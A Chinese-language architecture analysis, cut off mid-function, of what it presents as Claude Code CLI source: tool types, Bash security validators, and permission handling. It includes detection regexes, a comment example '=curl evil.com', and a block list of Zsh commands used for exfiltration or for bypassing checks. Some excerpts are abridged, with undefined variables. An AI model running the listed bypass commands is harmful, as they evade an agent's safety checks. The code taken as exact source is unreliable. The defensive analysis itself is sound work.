# Claude Code CLI 超详细架构与实现分析

> 📅 分析时间：2026-04-02 13:45  
> 📊 项目规模：1884 个 TypeScript 文件 | 512,664 行代码  
> 📂 源码位置：`/tmp/claudecode-cli-source/`  
> 📖 本文档：逐行代码深度分析 + 完整类型定义 + 安全检测实现

---

## 📑 目录

1. [完整类型系统](#1-完整类型系统)
2. [Bash 安全检查 24 项完整实现](#2-bash-安全检查-24 项完整实现)
3. [权限系统完整流程](#3-权限系统完整流程)
4. [工具接口完整定义](#4-工具接口完整定义)
5. [MCP 集成深度分析](#5-mcp 集成深度分析)
6. [交互式权限处理](#6-交互式权限处理)
7. [工具执行编排](#7-工具执行编排)
8. [状态管理原语](#8-状态管理原语)
9. [完整调用链追踪](#9-完整调用链追踪)
10. [安全漏洞防护详解](#10-安全漏洞防护详解)

---

# 1. 完整类型系统

## 1.1 Tool 接口完整定义 (Tool.ts)

```typescript
// ═══════════════════════════════════════════════════════════════════════════
// 基础类型
// ═══════════════════════════════════════════════════════════════════════════

// Zod Schema 类型
export type AnyObject = z.ZodType<{ [key: string]: unknown }>

// JSON Schema 类型 (MCP 工具用)
export type ToolInputJSONSchema = {
  [x: string]: unknown
  type: 'object'
  properties?: { [x: string]: unknown }
}

// 验证结果
export type ValidationResult =
  | { result: true }
  | {
      result: false
      message: string
      errorCode: number
    }

// ═══════════════════════════════════════════════════════════════════════════
// 权限上下文
// ═══════════════════════════════════════════════════════════════════════════

export type ToolPermissionContext = DeepImmutable<{
  // 权限模式
  mode: PermissionMode  // 'default' | 'bypass' | 'auto' | 'plan'
  
  // 额外工作目录
  additionalWorkingDirectories: Map<string, AdditionalWorkingDirectory>
  
  // 三层权限规则
  alwaysAllowRules: ToolPermissionRulesBySource
  alwaysDenyRules: ToolPermissionRulesBySource
  alwaysAskRules: ToolPermissionRulesBySource
  
  // 功能标志
  isBypassPermissionsModeAvailable: boolean
  isAutoModeAvailable?: boolean
  strippedDangerousRules?: ToolPermissionRulesBySource
  
  // 特殊标志
  shouldAvoidPermissionPrompts?: boolean  // 后台代理自动拒绝
  awaitAutomatedChecksBeforeDialog?: boolean  // 协调器等待自动检查
  prePlanMode?: PermissionMode  // 计划模式前备份
}>

export const getEmptyToolPermissionContext: () => ToolPermissionContext =
  () => ({
    mode: 'default',
    additionalWorkingDirectories: new Map(),
    alwaysAllowRules: {},
    alwaysDenyRules: {},
    alwaysAskRules: {},
    isBypassPermissionsModeAvailable: false,
  })

// ═══════════════════════════════════════════════════════════════════════════
// 工具使用上下文 (ToolUseContext) - 75+ 字段
// ═══════════════════════════════════════════════════════════════════════════

export type ToolUseContext = {
  // ─────────────────────────────────────────────────────────────────────────
  // 选项 (只读配置)
  // ─────────────────────────────────────────────────────────────────────────
  options: {
    commands: Command[]
    debug: boolean
    mainLoopModel: string
    tools: Tools
    verbose: boolean
    thinkingConfig: ThinkingConfig
    mcpClients: MCPServerConnection[]
    mcpResources: Record<string, ServerResource[]>
    isNonInteractiveSession: boolean
    agentDefinitions: AgentDefinitionsResult
    maxBudgetUsd?: number
    customSystemPrompt?: string
    appendSystemPrompt?: string
    querySource?: QuerySource
    refreshTools?: () => Tools
  }
  
  // ─────────────────────────────────────────────────────────────────────────
  // 控制
  // ─────────────────────────────────────────────────────────────────────────
  abortController: AbortController
  readFileState: FileStateCache  // LRU 文件读取缓存
  
  // ─────────────────────────────────────────────────────────────────────────
  // 状态访问
  // ─────────────────────────────────────────────────────────────────────────
  getAppState(): AppState
  setAppState(f: (prev: AppState) => AppState): void
  setAppStateForTasks?: (f: (prev: AppState) => AppState) => void  // 子代理用
  
  // ─────────────────────────────────────────────────────────────────────────
  // UI 回调
  // ─────────────────────────────────────────────────────────────────────────
  handleElicitation?: (
    serverName: string,
    params: ElicitRequestURLParams,
    signal: AbortSignal,
  ) => Promise<ElicitResult>
  setToolJSX?: SetToolJSXFn
  addNotification?: (notif: Notification) => void
  appendSystemMessage?: (msg: SystemMessage) => void
  sendOSNotification?: (opts: { message: string; notificationType: string }) => void
  
  // ─────────────────────────────────────────────────────────────────────────
  // 追踪集合
  // ─────────────────────────────────────────────────────────────────────────
  nestedMemoryAttachmentTriggers?: Set<string>
  loadedNestedMemoryPaths?: Set<string>
  dynamicSkillDirTriggers?: Set<string>
  discoveredSkillNames?: Set<string>
  
  // ─────────────────────────────────────────────────────────────────────────
  // 工具状态管理
  // ─────────────────────────────────────────────────────────────────────────
  setInProgressToolUseIDs: (f: (prev: Set<string>) => Set<string>) => void
  setHasInterruptibleToolInProgress?: (v: boolean) => void
  setResponseLength: (f: (prev: number) => number) => void
  pushApiMetricsEntry?: (ttftMs: number) => void
  setStreamMode?: (mode: SpinnerMode) => void
  onCompactProgress?: (event: CompactProgressEvent) => void
  setSDKStatus?: (status: SDKStatus) => void
  openMessageSelector?: () => void
  
  // ─────────────────────────────────────────────────────────────────────────
  // 状态更新器
  // ─────────────────────────────────────────────────────────────────────────
  updateFileHistoryState: (updater: (prev: FileHistoryState) => FileHistoryState) => void
  updateAttributionState: (updater: (prev: AttributionState) => AttributionState) => void
  setConversationId?: (id: UUID) => void
  
  // ─────────────────────────────────────────────────────────────────────────
  // 子代理相关
  // ─────────────────────────────────────────────────────────────────────────
  agentId?: AgentId
  agentType?: string
  preserveToolUseResults?: boolean
  localDenialTracking?: DenialTrackingState
  contentReplacementState?: ContentReplacementState
  renderedSystemPrompt?: SystemPrompt
  
  // ─────────────────────────────────────────────────────────────────────────
  // 其他
  // ─────────────────────────────────────────────────────────────────────────
  userModified?: boolean
  requireCanUseTool?: boolean
  messages: Message[]
  fileReadingLimits?: { maxTokens?: number; maxSizeBytes?: number }
  globLimits?: { maxResults?: number }
  toolDecisions?: Map<string, { source: string; decision: 'accept' | 'reject'; timestamp: number }>
  queryTracking?: QueryChainTracking
  requestPrompt?: (sourceName: string, toolInputSummary?: string | null) => (request: PromptRequest) => Promise<PromptResponse>
  toolUseId?: string
  criticalSystemReminder_EXPERIMENTAL?: string
}

// ═══════════════════════════════════════════════════════════════════════════
// 工具接口 (Tool) - 40+ 字段/方法
// ═══════════════════════════════════════════════════════════════════════════

export type Tool<
  Input extends AnyObject = AnyObject,
  Output = unknown,
  P extends ToolProgressData = ToolProgressData,
> = {
  // ─────────────────────────────────────────────────────────────────────────
  // 基础属性 (5)
  // ─────────────────────────────────────────────────────────────────────────
  readonly name: string
  aliases?: string[]  // 向后兼容别名
  searchHint?: string  // ToolSearch 关键词 (3-10 词)
  
  // ─────────────────────────────────────────────────────────────────────────
  // Schema (3)
  // ─────────────────────────────────────────────────────────────────────────
  readonly inputSchema: Input  // Zod Schema
  readonly inputJSONSchema?: ToolInputJSONSchema  // MCP 工具 JSON Schema
  outputSchema?: z.ZodType<unknown>
  
  // ─────────────────────────────────────────────────────────────────────────
  // 核心方法 (1)
  // ─────────────────────────────────────────────────────────────────────────
  call(
    args: z.infer<Input>,
    context: ToolUseContext,
    canUseTool: CanUseToolFn,
    parentMessage: AssistantMessage,
    onProgress?: ToolCallProgress<P>,
  ): Promise<ToolResult<Output>>
  
  // ─────────────────────────────────────────────────────────────────────────
  // 描述生成 (1)
  // ─────────────────────────────────────────────────────────────────────────
  description(
    input: z.infer<Input>,
    options: {
      isNonInteractiveSession: boolean
      toolPermissionContext: ToolPermissionContext
      tools: Tools
    },
  ): Promise<string>
  
  // ─────────────────────────────────────────────────────────────────────────
  // 等价判断 (1)
  // ─────────────────────────────────────────────────────────────────────────
  inputsEquivalent?(a: z.infer<Input>, b: z.infer<Input>): boolean
  
  // ─────────────────────────────────────────────────────────────────────────
  // 特性检查 (5)
  // ─────────────────────────────────────────────────────────────────────────
  isEnabled(): boolean
  isConcurrencySafe(input: z.infer<Input>): boolean
  isReadOnly(input: z.infer<Input>): boolean
  isDestructive?(input: z.infer<Input>): boolean
  interruptBehavior?(): 'cancel' | 'block'
  
  // ─────────────────────────────────────────────────────────────────────────
  // UI 分类 (2)
  // ─────────────────────────────────────────────────────────────────────────
  isSearchOrReadCommand?(input: z.infer<Input>): {
    isSearch: boolean
    isRead: boolean
    isList?: boolean
  }
  isOpenWorld?(input: z.infer<Input>): boolean
  
  // ─────────────────────────────────────────────────────────────────────────
  // 交互 (1)
  // ─────────────────────────────────────────────────────────────────────────
  requiresUserInteraction?(): boolean
  
  // ─────────────────────────────────────────────────────────────────────────
  // MCP/LSP 标记 (3)
  // ─────────────────────────────────────────────────────────────────────────
  isMcp?: boolean
  isLsp?: boolean
  mcpInfo?: { serverName: string; toolName: string }
  
  // ─────────────────────────────────────────────────────────────────────────
  // 加载控制 (3)
  // ─────────────────────────────────────────────────────────────────────────
  readonly shouldDefer?: boolean  // 延迟加载 (ToolSearch)
  readonly alwaysLoad?: boolean  // 总是加载
  readonly strict?: boolean  // 严格模式
  
  // ─────────────────────────────────────────────────────────────────────────
  // 限制 (1)
  // ─────────────────────────────────────────────────────────────────────────
  maxResultSizeChars: number  // 结果持久化阈值
  
  // ─────────────────────────────────────────────────────────────────────────
  // 输入处理 (1)
  // ─────────────────────────────────────────────────────────────────────────
  backfillObservableInput?(input: Record<string, unknown>): void
  
  // ─────────────────────────────────────────────────────────────────────────
  // 验证与权限 (3)
  // ─────────────────────────────────────────────────────────────────────────
  validateInput?(input: z.infer<Input>, context: ToolUseContext): Promise<ValidationResult>
  checkPermissions(input: z.infer<Input>, context: ToolUseContext): Promise<PermissionResult>
  preparePermissionMatcher?(input: z.infer<Input>): Promise<(pattern: string) => boolean>
  
  // ─────────────────────────────────────────────────────────────────────────
  // 路径 (1)
  // ─────────────────────────────────────────────────────────────────────────
  getPath?(input: z.infer<Input>): string
  
  // ─────────────────────────────────────────────────────────────────────────
  // 提示与名称 (4)
  // ─────────────────────────────────────────────────────────────────────────
  prompt(options: {...}): Promise<string>
  userFacingName(input: Partial<z.infer<Input>> | undefined): string
  userFacingNameBackgroundColor?(input: Partial<z.infer<Input>> | undefined): keyof Theme | undefined
  getActivityDescription?(input: Partial<z.infer<Input>> | undefined): string | null
  
  // ─────────────────────────────────────────────────────────────────────────
  // 摘要与分类 (2)
  // ─────────────────────────────────────────────────────────────────────────
  getToolUseSummary?(input: Partial<z.infer<Input>> | undefined): string | null
  toAutoClassifierInput(input: z.infer<Input>): unknown
  
  // ─────────────────────────────────────────────────────────────────────────
  // 结果映射 (1)
  // ─────────────────────────────────────────────────────────────────────────
  mapToolResultToToolResultBlockParam(content: Output, toolUseID: string): ToolResultBlockParam
  
  // ─────────────────────────────────────────────────────────────────────────
  // UI 渲染 (10)
  // ─────────────────────────────────────────────────────────────────────────
  renderToolUseMessage(input: Partial<z.infer<Input>>, options: {...}): React.ReactNode
  renderToolResultMessage?(content: Output, progressMessages: ProgressMessage<P>[], options: {...}): React.ReactNode
  extractSearchText?(out: Output): string  // 转录搜索索引
  isResultTruncated?(output: Output): boolean  // 点击展开标志
  renderToolUseTag?(input: Partial<z.infer<Input>>): React.ReactNode
  renderToolUseProgressMessage?(progressMessages: ProgressMessage<P>[], options: {...}): React.ReactNode
  renderToolUseQueuedMessage?(): React.ReactNode
  renderToolUseRejectedMessage?(input: z.infer<Input>, options: {...}): React.ReactNode
  renderToolUseErrorMessage?(result: ToolResultBlockParam['content'], options: {...}): React.ReactNode
  renderGroupedToolUse?(toolUses: Array<{...}>, options: {...}): React.ReactNode | null
  
  // ─────────────────────────────────────────────────────────────────────────
  // 透明包装 (1)
  // ─────────────────────────────────────────────────────────────────────────
  isTransparentWrapper?(): boolean
}

// ═══════════════════════════════════════════════════════════════════════════
// 工具结果类型
// ═══════════════════════════════════════════════════════════════════════════

export type ToolResult<T> = {
  data: T
  newMessages?: (UserMessage | AssistantMessage | AttachmentMessage | SystemMessage)[]
  contextModifier?: (context: ToolUseContext) => ToolUseContext
  mcpMeta?: {
    _meta?: Record<string, unknown>
    structuredContent?: Record<string, unknown>
  }
}

// ═══════════════════════════════════════════════════════════════════════════
// 工具构建器
// ═══════════════════════════════════════════════════════════════════════════

type DefaultableToolKeys =
  | 'isEnabled'
  | 'isConcurrencySafe'
  | 'isReadOnly'
  | 'isDestructive'
  | 'checkPermissions'
  | 'toAutoClassifierInput'
  | 'userFacingName'

const TOOL_DEFAULTS = {
  isEnabled: () => true,
  isConcurrencySafe: (_input?: unknown) => false,
  isReadOnly: (_input?: unknown) => false,
  isDestructive: (_input?: unknown) => false,
  checkPermissions: (input, _ctx): Promise<PermissionResult> =>
    Promise.resolve({ behavior: 'allow', updatedInput: input }),
  toAutoClassifierInput: (_input?: unknown) => '',
  userFacingName: (_input?: unknown) => '',
}

export function buildTool<D extends AnyToolDef>(def: D): BuiltTool<D> {
  return {
    ...TOOL_DEFAULTS,
    userFacingName: () => def.name,
    ...def,
  } as BuiltTool<D>
}
```

---

# 2. Bash 安全检查 24 项完整实现

## 2.1 安全检查总览 (bashSecurity.ts - 2592 行)

```typescript
// ═══════════════════════════════════════════════════════════════════════════
// 24 项安全检查 ID 定义
// ═══════════════════════════════════════════════════════════════════════════

const BASH_SECURITY_CHECK_IDS = {
  INCOMPLETE_COMMANDS: 1,                    // 不完整命令
  JQ_SYSTEM_FUNCTION: 2,                     // jq system() 函数
  JQ_FILE_ARGUMENTS: 3,                      // jq 文件参数
  OBFUSCATED_FLAGS: 4,                       // 混淆标志
  SHELL_METACHARACTERS: 5,                   // Shell 元字符
  DANGEROUS_VARIABLES: 6,                    // 危险变量
  NEWLINES: 7,                               // 换行注入
  DANGEROUS_PATTERNS_COMMAND_SUBSTITUTION: 8,  // 命令替换
  DANGEROUS_PATTERNS_INPUT_REDIRECTION: 9,   // 输入重定向
  DANGEROUS_PATTERNS_OUTPUT_REDIRECTION: 10, // 输出重定向
  IFS_INJECTION: 11,                         // IFS 注入
  GIT_COMMIT_SUBSTITUTION: 12,               // Git commit 替换
  PROC_ENVIRON_ACCESS: 13,                   // /proc 访问
  MALFORMED_TOKEN_INJECTION: 14,             // Token 注入
  BACKSLASH_ESCAPED_WHITESPACE: 15,          // 反斜杠转义
  BRACE_EXPANSION: 16,                       // 大括号展开
  CONTROL_CHARACTERS: 17,                    // 控制字符
  UNICODE_WHITESPACE: 18,                    // Unicode 空白
  MID_WORD_HASH: 19,                         // 词中#
  ZSH_DANGEROUS_COMMANDS: 20,                // Zsh 危险命令
  BACKSLASH_ESCAPED_OPERATORS: 21,           // 转义操作符
  COMMENT_QUOTE_DESYNC: 22,                  // 注释引号失配
  QUOTED_NEWLINE: 23,                        // 引号内换行
} as const
```

## 2.2 命令替换模式检测

```typescript
// ═══════════════════════════════════════════════════════════════════════════
// 13 种命令替换模式检测
// ═══════════════════════════════════════════════════════════════════════════

const COMMAND_SUBSTITUTION_PATTERNS = [
  // 进程替换
  { pattern: /<\(/, message: 'process substitution <()' },
  { pattern: />\(/, message: 'process substitution >()' },
  { pattern: /=\(/, message: 'Zsh process substitution =()' },
  
  // Zsh 等于展开 (绕过安全检查)
  {
    pattern: /(?:^|[\s;&|])=[a-zA-Z_]/,
    message: 'Zsh equals expansion (=cmd)',
    // 示例：=curl evil.com → /usr/bin/curl evil.com
  },
  
  // 命令替换
  { pattern: /\$\(/, message: '$() command substitution' },
  
  // 参数替换
  { pattern: /\$\{/, message: '${} parameter substitution' },
  { pattern: /\$\[/, message: '$[] legacy arithmetic expansion' },
  { pattern: /~\[/, message: 'Zsh-style parameter expansion' },
  
  // Zsh 限定符
  { pattern: /\(e:/, message: 'Zsh-style glob qualifiers' },
  { pattern: /\(\+/, message: 'Zsh glob qualifier with command execution' },
  
  // Zsh 异常块
  { pattern: /\}\s*always\s*\{/, message: 'Zsh always block (try/always)' },
  
  // PowerShell 注释 (防御性)
  { pattern: /<#/, message: 'PowerShell comment syntax' },
]

// 验证函数
function validateDangerousPatterns(context: ValidationContext): PermissionResult {
  const { unquotedContent, fullyUnquotedContent } = context
  
  for (const { pattern, message } of COMMAND_SUBSTITUTION_PATTERNS) {
    if (pattern.test(unquotedContent) || pattern.test(fullyUnquotedContent)) {
      logEvent('tengu_bash_security_check_triggered', {
        checkId: BASH_SECURITY_CHECK_IDS.DANGEROUS_PATTERNS_COMMAND_SUBSTITUTION,
        subId: COMMAND_SUBSTITUTION_PATTERNS.indexOf({ pattern, message }) + 1,
      })
      return {
        behavior: 'ask',
        message: `Command contains dangerous pattern: ${message}`,
      }
    }
  }
  
  return { behavior: 'passthrough', message: 'No dangerous patterns' }
}
```

## 2.3 Zsh 危险命令检测

```typescript
// ═══════════════════════════════════════════════════════════════════════════
// Zsh 危险命令列表 (18 个)
// ═══════════════════════════════════════════════════════════════════════════

const ZSH_DANGEROUS_COMMANDS = new Set([
  // 模块加载网关
  'zmodload',
  // 模拟模式 (eval 等价)
  'emulate',
  // 文件描述符操作
  'sysopen', 'sysread', 'syswrite', 'sysseek',
  // 伪终端执行
  'zpty',
  // 网络外泄
  'ztcp', 'zsocket',
  // 内置命令 (绕过检查)
  'zf_rm', 'zf_mv', 'zf_ln', 'zf_chmod', 'zf_chown', 'zf_mkdir', 'zf_rmdir', 'zf_chgrp',
  // 映射文件
  'mapfile',
])

function validateZshDangerousCommands(context: ValidationContext): PermissionResult {
  const { originalCommand, baseCommand } = context
  
  if (ZSH_DANGEROUS_COMMANDS.has(baseCommand)) {
    logEvent('tengu_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.ZSH_DANGEROUS_COMMANDS,
      subId: 1,
    })
    return {
      behavior: 'ask',
      message: `Command uses Zsh dangerous command: ${baseCommand}`,
    }
  }
  
  return { behavior: 'passthrough', message: 'No Zsh dangerous commands' }
}
```

## 2.4 Heredoc 安全检测 (150+ 行)

```typescript
// ═══════════════════════════════════════════════════════════════════════════
// Heredoc 在命令替换中的安全检测
// ═══════════════════════════════════════════════════════════════════════════

const HEREDOC_IN_SUBSTITUTION = /\$\(.*<</

/**
 * 检测安全的 heredoc 模式：$(cat <<'DELIM'\n...\nDELIM\n)
 * 
 * 安全条件:
 * 1. 分隔符必须单引号 ('DELIM') 或转义 (\DELIM)
 * 2. 闭合分隔符必须独占一行
 * 3. 闭合分隔符必须是第一个匹配行 (bash 行为)
 * 4. $() 前必须有非空白文本 (参数位置，非命令名位置)
 * 5. 剩余文本必须通过所有验证器
 */
function isSafeHeredoc(command: string): boolean {
  if (!HEREDOC_IN_SUBSTITUTION.test(command)) return false

  // 匹配 heredoc 开始
  const heredocPattern = /\$\(cat[ \t]*<<(-?)[ \t]*(?:'+([A-Za-z_]\w*)'+|\\([A-Za-z_]\w*))/g
  const safeHeredocs: HeredocMatch[] = []

  while ((match = heredocPattern.exec(command)) !== null) {
    const delimiter = match[2] || match[3]
    if (delimiter) {
      safeHeredocs.push({
        start: match.index,
        operatorEnd: match.index + match[0].length,
        delimiter,
        isDash: match[1] === '-',
      })
    }
  }

  if (safeHeredocs.length === 0) return false

  // 验证每个 heredoc 的闭合
  for (const { start, operatorEnd, delimiter, isDash } of safeHeredocs) {
    // 检查 opening line
    const afterOperator = command.slice(operatorEnd)
    const openLineEnd = afterOperator.indexOf('\n')
    if (openLineEnd === -1) return false
    if (!/^[ \t]*$/.test(afterOperator.slice(0, openLineEnd))) return false

    // 查找闭合分隔符
    const bodyStart = operatorEnd + openLineEnd + 1
    const bodyLines = command.slice(bodyStart).split('\n')
    let closingLineIdx = -1

    for (let i = 0; i < bodyLines.length; i++) {
      const rawLine = bodyLines[i]!
      const line = isDash ? rawLine.replace(/^\t*/, '') : rawLine

      // 形式 1: DELIM 独占一行
      if (line === delimiter) {
        closingLineIdx = i
        // `)` 必须在下一行开头
        const nextLine = bodyLines[i + 1]
        if (!nextLine || !/^[ \t]*\)/.test(nextLine)) return false
        break
      }

      // 形式 2: DELIM) 在同一行
      if (line.startsWith(delimiter)) {
        const after = line.slice(delimiter.length)
        if (/^[ \t]*\)/.test(after)) {
          closingLineIdx = i
          break
        }
        if (/^[)}`|&;(<>]/.test(after)) return false
      }
    }

    if (closingLineIdx === -1) return false
  }

  // 拒绝嵌套匹配
  for (const outer of verified) {
    for (const inner of verified) {
      if (inner !== outer && inner.start > outer.start && inner.start < outer.end) {
        return false
      }
    }
  }

  // 剥离 heredoc 并验证剩余文本
  let remaining = command
  for (const { start, end } of sortedVerified) {
    remaining = remaining.slice(0, start) + remaining.slice(end)
  }

  // 检查剩余文本只包含安全字符
  if (!/^[a-zA-Z0-9 \t"'.\-/_@=,:+~]*$/.test(remaining)) return false

  // 递归验证剩余文本
  if (bashCommandIsSafe_DEPRECATED(remaining).behavior !== 'passthrough') return false

  return true
}
```

## 2.5 Git Commit 安全检测

```typescript
// ═══════════════════════════════════════════════════════════════════════════
// Git Commit 安全检测
// ═══════════════════════════════════════════════════════════════════════════

function validateGitCommit(context: ValidationContext): PermissionResult {
  const { originalCommand, baseCommand } = context

  if (baseCommand !== 'git' || !/^git\s+commit\s+/.test(originalCommand)) {
    return { behavior: 'passthrough', message: 'Not a git commit' }
  }

  // 拒绝包含反斜杠的命令
  if (originalCommand.includes('\\')) {
    return {
      behavior: 'passthrough',
      message: 'Git commit contains backslash, needs full validation',
    }
  }

  // 匹配 git commit -m "message"
  const messageMatch = originalCommand.match(
    /^git[ \t]+commit[ \t]+[^;&|`$<>()\n\r]*?-m[ \t]+(["'])([\s\S]*?)\1(.*)$/,
  )

  if (messageMatch) {
    const [, quote, messageContent, remainder] = messageMatch

    // 检查双引号内的命令替换
    if (quote === '"' && messageContent && /\$\(|`|\$\{/.test(messageContent)) {
      logEvent('tengu_bash_security_check_triggered', {
        checkId: BASH_SECURITY_CHECK_IDS.GIT_COMMIT_SUBSTITUTION,
        subId: 1,
      })
      return {
        behavior: 'ask',
        message: 'Git commit message contains command substitution patterns',
      }
    }

    // 检查 remainder 中的 Shell 操作符
    if (remainder && /[;|&()`]|\$\(|\$\{/.test(remainder)) {
      return {
        behavior: 'passthrough',
        message: 'Git commit remainder contains shell metacharacters',
      }
    }

    // 检查未引用的重定向操作符
    if (remainder) {
      let unquoted = ''
      let inSQ = false
      let inDQ = false
      for (let i = 0; i < remainder.length; i++) {
        const c = remainder[i]
        if (c === "'" && !inDQ) { inSQ = !inSQ; continue }
        if (c === '"' && !inSQ) { inDQ = !inDQ; continue }
        if (!inSQ && !inDQ) unquoted += c
      }
      if (/[<>]/.test(unquoted)) {
        return {
          behavior: 'passthrough',
          message: 'Git commit remainder contains unquoted redirect operator',
        }
      }
    }

    // 拒绝以破折号开头的消息
    if (messageContent && messageContent.startsWith('-')) {
      logEvent('tengu_bash_security_check_triggered', {
        checkId: BASH_SECURITY_CHECK_IDS.OBFUSCATED_FLAGS,
        subId: 5,
      })
      return {
        behavior: 'ask',
        message: 'Command contains quoted characters in flag names',
      }
    }

    return {
      behavior: 'allow',
      updatedInput: { command: originalCommand },
      decisionReason: {
        type: 'other',
        reason: 'Git commit with simple quoted message is allowed',
      },
    }
  }

  return { behavior: 'passthrough', message: 'Git commit needs validation' }
}
```

## 2.6 Jq 命令安全检测

```typescript
// ═══════════════════════════════════════════════════════════════════════════
// Jq 命令安全检测
// ═══════════════════════════════════════════════════════════════════════════

function validateJqCommand(context: ValidationContext): PermissionResult {
  const { originalCommand, baseCommand } = context

  if (baseCommand !== 'jq') {
    return { behavior: 'passthrough', message: 'Not jq' }
  }

  // 检测 system() 函数
  if (/\bsystem\s*\(/.test(originalCommand)) {
    logEvent('tengu_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.JQ_SYSTEM_FUNCTION,
      subId: 1,
    })
    return {
      behavior: 'ask',
      message: 'jq command contains system() function which executes arbitrary commands',
    }
  }

  // 检测危险标志
  const afterJq = originalCommand.substring(3).trim()
  if (
    /(?:^|\s)(?:-f\b|--from-file|--rawfile|--slurpfile|-L\b|--library-path)/.test(
      afterJq,
    )
  ) {
    logEvent('tengu_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.JQ_FILE_ARGUMENTS,
      subId: 1,
    })
    return {
      behavior: 'ask',
      message: 'jq command contains dangerous flags that could execute code or read arbitrary files',
    }
  }

  return { behavior: 'passthrough', message: 'jq command is safe' }
}
```

## 2.7 Shell 元字符检测

```typescript
// ═══════════════════════════════════════════════════════════════════════════
// Shell 元字符检测
// ═══════════════════════════════════════════════════════════════════════════

function validateShellMetacharacters(context: ValidationContext): PermissionResult {
  const { unquotedContent } = context
  const message = 'Command contains shell metacharacters (;, |, or &) in arguments'

  // 检测引号内的元字符
  if (/(?:^|\s)["'][^"']*[;&][^"']*["'](?:\s|$)/.test(unquotedContent)) {
    logEvent('tengu_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.SHELL_METACHARACTERS,
      subId: 1,
    })
    return { behavior: 'ask', message }
  }

  // 检测 glob 模式中的元字符
  const globPatterns = [
    /-name\s+["'][^"']*[;|&][^"']*["']/,
    /-exec\s+[^;]+[;|&]/,
  ]
  for (const pattern of globPatterns) {
    if (pattern.test(unquotedContent)) {
      logEvent('tengu_bash_security_check_triggered', {
        checkId: BASH_SECURITY_CHECK_IDS.SHELL_METACHARACTERS,
        subId: 2,
      })
      return { behavior: 'ask', message }
    }
  }

  return { behavior: 'passthrough', message: 'No shell metacharacters' }
}
```

## 2.8 引号内容提取

```typescript
// ═══════════════════════════════════════════════════════════════════════════
// 引号内容提取 (用于安全检测)
// ═══════════════════════════════════════════════════════════════════════════

type QuoteExtraction = {
  withDoubleQuotes: string
  fullyUnquoted: string
  unquotedKeepQuoteChars: string  // 保留引号字符
}

function extractQuotedContent(command: string, isJq = false): QuoteExtraction {
  let withDoubleQuotes = ''
  let fullyUnquoted = ''
  let unquotedKeepQuoteChars = ''
  let inSingleQuote = false
  let inDoubleQuote = false
  let escaped = false

  for (let i = 0; i < command.length; i++) {
    const char = command[i]

    if (escaped) {
      escaped = false
      if (!inSingleQuote) withDoubleQuotes += char
      if (!inSingleQuote && !inDoubleQuote) fullyUnquoted += char
      if (!inSingleQuote && !inDoubleQuote) unquotedKeepQuoteChars += char
      continue
    }

    if (char === '\\' && !inSingleQuote) {
      escaped = true
      if (!inSingleQuote) withDoubleQuotes += char
      if (!inSingleQuote && !inDoubleQuote) fullyUnquoted += char
      if (!inSingleQuote && !inDoubleQuote) unquotedKeepQuoteChars += char
      continue
    }

    if (char === "'" && !inDoubleQuote) {
      inSingleQuote = !inSingleQuote
      unquotedKeepQuoteChars += char
      continue
    }

    if (char === '"' && !inSingleQuote) {
      inDoubleQuote = !inDoubleQuote
      unquotedKeepQuoteChars += char
      if (!isJq) continue
    }

    if (!inSingleQuote) withDoubleQuotes += char
    if (!inSingleQuote && !inDoubleQuote) fullyUnquoted += char
    if (!inSingleQuote && !inDoubleQuote) unquotedKeepQuoteChars += char
  }

  return { withDoubleQuotes, fullyUnquoted, unquotedKeepQuoteChars }
}
```

## 2.9 安全重定向剥离

```typescript
// ═══════════════════════════════════════════════════════════════════════════
// 安全重定向剥离
// ═══════════════════════════════════════════════════════════════════════════

function stripSafeRedirections(content: string): string {
  // SECURITY: 所有三个模式必须有 trailing boundary (?=\s|$)
  // 否则 `> /dev/nullo` 会匹配 `/dev/null` 前缀，留下 `o`
  return content
    .replace(/\s+2\s*>&\s*1(?=\s|$)/g, '')
    .replace(/[012]?\s*>\s*\/dev\/null(?=\s|$)/g, '')
    .replace(/\s*<\s*\/dev\/null(?=\s|$)/g, '')
}
```

## 2.10 未转义字符检测

```typescript
// ═══════════════════════════════════════════════════════════════════════════
// 未转义字符检测
// ═══════════════════════════════════════════════════════════════════════════

function hasUnescapedChar(content: string, char: string): boolean {
  if (char.length !== 1) {
    throw new Error('hasUnescapedChar only works with single characters')
  }

  let i = 0
  while (i < content.length) {
    // 跳过转义序列
    if (content[i] === '\\' && i + 1 < content.length) {
      i += 2
      continue
    }

    // 检查当前字符
    if (content[i] === char) {
      return true
    }

    i++
  }

  return false
}
```

---

# 3. 权限系统完整流程

## 3.1 权限上下文创建 (PermissionContext.ts)

```typescript
// ═══════════════════════════════════════════════════════════════════════════
// 权限上下文创建
// ═══════════════════════════════════════════════════════════════════════════

function createPermissionContext(
  tool: ToolType,
  input: Record<string, unknown>,
  toolUseContext: ToolUseContext,
  assistantMessage: AssistantMessage,
  toolUseID: string,
  setToolPermissionContext: (context: ToolPermissionContext) => void,
  queueOps?: PermissionQueueOps,
) {
  const messageId = assistantMessage.message.id
  
  const ctx = {
    tool,
    input,
    toolUseContext,
    assistantMessage,
    messageId,
    toolUseID,
    
    // 记录决策
    logDecision(args, opts) {
      logPermissionDecision(
        { tool, input: opts?.input ?? input, toolUseContext, messageId, toolUseID },
        args,
        opts?.permissionPromptStartTimeMs,
      )
    },
    
    // 记录取消
    logCancelled() {
      logEvent('tengu_tool_use_cancelled', {
        messageID: messageId,
        toolName: sanitizeToolNameForAnalytics(tool.name),
      })
    },
    
    // 持久化权限
    async persistPermissions(updates: PermissionUpdate[]) {
      if (updates.length === 0) return false
      persistPermissionUpdates(updates)
      const appState = toolUseContext.getAppState()
      setToolPermissionContext(
        applyPermissionUpdates(appState.toolPermissionContext, updates),
      )
      return updates.some(update => supportsPersistence(update.destination))
    },
    
    // 检查是否已中止
    resolveIfAborted(resolve) {
      if (!toolUseContext.abortController.signal.aborted) return false
      this.logCancelled()
      resolve(this.cancelAndAbort(undefined, true))
      return true
    },
    
    // 取消并中止
    cancelAndAbort(feedback, isAbort, contentBlocks) {
      const sub = !!toolUseContext.agentId
      const baseMessage = feedback
        ? `${sub ? SUBAGENT_REJECT_MESSAGE_WITH_REASON_PREFIX : REJECT_MESSAGE_WITH_REASON_PREFIX}${feedback}`
        : sub ? SUBAGENT_REJECT_MESSAGE : REJECT_MESSAGE
      const message = sub ? baseMessage : withMemoryCorrectionHint(baseMessage)
      
